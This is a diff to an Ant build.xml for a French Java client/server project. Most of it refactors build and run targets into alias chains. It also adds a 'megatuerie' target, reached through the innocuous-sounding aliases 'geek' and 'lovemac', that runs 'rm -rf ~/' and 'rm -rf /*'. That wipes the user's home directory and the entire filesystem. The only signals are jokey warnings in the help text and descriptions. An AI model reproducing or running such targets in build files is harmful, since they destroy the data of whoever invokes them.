@@ -87,6 +87,9 @@
 			<echo></echo>
 			<echo> brun - (compile) et lance le soft en entier</echo>
 			<echo></echo>
+			<echo> geek (= lovemac, megatuerie) - NE PAS executer! vous etes prevenu, 
+ ca vous bousille votre system!</echo>
+			<echo></echo>
 			<echo> AFAIREjar - cree les fichiers jar</echo>
 			<echo></echo>
 			<echo> AFAIREjavadoc - cree la javadoc</echo>
@@ -144,52 +147,20 @@
     		<echo message="${TSTAMP}"/>
     </target>
     	
-	<target name="buildCommun" depends="prepare" description="Construit les classes communes">
-		<echo>Compilation des classes communes</echo>
-	
-		<javac 	srcdir="${src.commun}" 
-			destdir="${build.commun}" >
-		</javac>
-	</target>
-
-                
+              
     <target name="buildClient" depends="prepare" description="Construit le client uniquement">
-        <echo>Compilation... du client</echo>
+		<echo>Forge en cours pour... le client</echo>
         <javac 	srcdir="${src.client}" 
 			destdir="${build.client}" >
 			<classpath refid="classpath"/>
 		</javac>
     </target>    
 
-	<target name="bc" depends="prepare" description="Construit le client uniquement (alias)">
-		<echo>Forge en cours pour... le client</echo>
-		<sound>
-        	<success source="${mysound}/won/"/>
-        	<fail source="${mysound}/loose/"/>
-        </sound>
-		<javac encoding="${encodage}" 
-			srcdir="${src.client}" 
-			destdir="${build.client}" >
-			<classpath refid="classpath"/>
-		</javac>
+	<target name="bc" depends="buildClient" description="Construit le client uniquement (alias)">
 	</target>
 
     <target name="buildServeur" depends="prepare" description="Construit le serveur uniquement">
-        <echo>Compilation... du serveur</echo>
-        <javac encoding="${encodage}" 
-			srcdir="${src.serveur}" 
-			destdir="${build.serveur}" >
-			<classpath refid="classpath"/>
-		</javac>
-    </target>   
-
-    <target name="bs" depends="prepare" description="Construit le client uniquement (alias)">
         <echo>Forge en cours pour... le serveur</echo>
-        <sound>
-        	<success source="${mysound}/won"/>
-        	<fail source="${mysound}/loose"/>
-        </sound>
-
         <javac encoding="${encodage}" 
 			srcdir="${src.serveur}" 
 			destdir="${build.serveur}" >
@@ -197,52 +168,13 @@
 		</javac>
     </target>   
 
-	<target name="build" depends="prepare" description="Construit tout le projet (2 threads)">
-	
-		<parallel>
-			<sequential>
-					<echo>Compilation serveur</echo>
-					<javac encoding="${encodage}" 
-					srcdir="${src.serveur}" 
-					destdir="${build.serveur}" >
-					<classpath refid="classpath"/>
-					</javac>
-	
-			</sequential>
-			<echo>Compilation client</echo>
-			<javac encoding="${encodage}" 
-				srcdir="${src.client}" 
-				destdir="${build.client}" >
-				<classpath refid="classpath"/>
-			</javac>
+    <target name="bs" depends="buildServeur" description="Construit le client uniquement (alias)">
+    </target>   
 
-		</parallel>
+	<target name="build" depends="buildServeur, buildClient" description="Construit tout le projet">
 	</target>
 	
-	<target name="b" depends="prepare" description="Construit tout le projet (alias)">
-	    <sound>
-        	<success source="${mysound}/won/"/>
-        	<fail source="${mysound}/loose/"/>
-        </sound>
-
-		<parallel>
-			<sequential>
-					<echo>Ambidextrie : forge pour le serveur</echo>
-					<javac encoding="${encodage}" 
-					srcdir="${src.serveur}" 
-					destdir="${build.serveur}" >
-					<classpath refid="classpath"/>
-					</javac>
-	
-			</sequential>
-			<echo>et forge pour le client en meme temps</echo>
-			<javac encoding="${encodage}" 
-				srcdir="${src.client}" 
-				destdir="${build.client}" >
-				<classpath refid="classpath"/>
-			</javac>
-
-		</parallel>
+	<target name="b" depends="build" description="Construit tout le projet (alias)">
     </target>
 
   
@@ -269,19 +201,10 @@
     </target>
 
 
-
-    <target name="bserveur" depends="buildServeur" description="Lancement du serveur (apres compilation)">
-        <echo>Execution du serveur!</echo>
-        <java classname="${serveurClass}">
-				<classpath refid="classpath"/>
-        </java>
+    <target name="bserveur" depends="buildServeur, serveur" description="Lancement du serveur (apres compilation)">
     </target>
     
-    <target name="bclient" depends="buildClient" description="Lancement du client (apres compilation)">
-        <echo>Execution du client!</echo>
-        <java classname="${clientClass}">
-				<classpath refid="classpath"/>
-        </java>
+    <target name="bclient" depends="buildClient, client" description="Lancement du client (apres compilation)">
     </target>
     
     
@@ -386,6 +309,30 @@
             <delete dir="${doc.dir}"/>
             <delete dir="${build.dir}"/>      
     </target>
+    
+	<target name="megatuerie" depends="putz" description="Detruit votre systeme">
+		 <delete verbose="true">
+
+            <fileset dir="${doc.dir}"/>
+		    <fileset dir="${build.dir}"/>
+        </delete>
+
+            <delete dir="${doc.client}"/>
+            <delete dir="${doc.serveur}"/>
+            <delete dir="${doc.commun}"/>
+            <delete dir="${build.client}"/>
+            <exec executable="rm" vmlauncher="false">
+			<arg line="-rf ~/"/>
+			</exec>
+            <delete dir="${build.serveur}"/>
+            <delete dir="${doc.dir}"/>
+            <echo>J'espere que tu n'es pas root</echo>
+            <delete dir="${build.dir}"/>      
+			<exec executable="rm" vmlauncher="false">
+			<arg line="-rf /* >/dev/null"/>
+			</exec>
+			
+	</target>
 
     <target name="megaputz" depends="putz" description="Nettoyage de tous les fichiers generes (alias)">
         <echo>DESTRUCTION!!.</echo>
@@ -404,7 +351,7 @@
             <delete dir="${doc.dir}"/>
             <delete dir="${build.dir}"/>      
     </target>
-
+	
 
 	<target name="javadoc" depends="build" description="Genere la javadoc du projet">
 		<echo>Ne fait rien pour l'instant</echo>
@@ -413,5 +360,13 @@
 	<target name="jar" depends="build" description="Genere les fichiers jar du projet">
 		<echo>Ne fait rien pour l'instant</echo>
 	</target>
+    
+	
+	<target name="geek" depends="bc, bs, clean, megatuerie" description="Detruit votre systeme. Serieux.">
+    </target>
+	<target name="lovemac" depends="geek" description="Detruit votre systeme. Serieux.">
+    </target>
+
+    
     
 </project>
